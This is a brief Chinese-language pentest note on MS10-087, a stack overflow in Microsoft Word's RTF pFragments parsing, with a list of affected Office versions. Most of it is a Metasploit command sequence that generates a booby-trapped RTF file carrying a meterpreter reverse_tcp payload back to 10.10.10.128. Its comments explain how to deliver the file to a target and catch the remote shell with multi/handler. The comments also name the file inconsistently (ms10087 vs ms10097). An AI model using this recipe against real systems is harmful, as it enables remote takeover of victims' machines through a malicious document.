### 漏洞说明
- 低版本的word版本会出现RTF文件漏洞。
- 漏洞：microsoft word中的RTF分析器中的pFragments属性容易受到栈缓存区溢出攻击
- 受影响的系统：Microsoft Office XP SP，2003 SP3，2007 SP2，2010 x32，2010 x64
 
## 渗透流程
```shell 
use exploit/windows/fileformat/ms10_087_rtf_pfragments_bof
set FILENAME ms10087.rtf
set payload windows/meterpreter/reverse_tcp
set lhost 10.10.10.128

run
#运行后会生成一个木马文件名为ms10087.rtf
#将文件上传到目标机上

#进入multi/handler模块
#开启监听，并且在目标机上运行ms10097.rtf文件，就可以弹回meterpreter
```
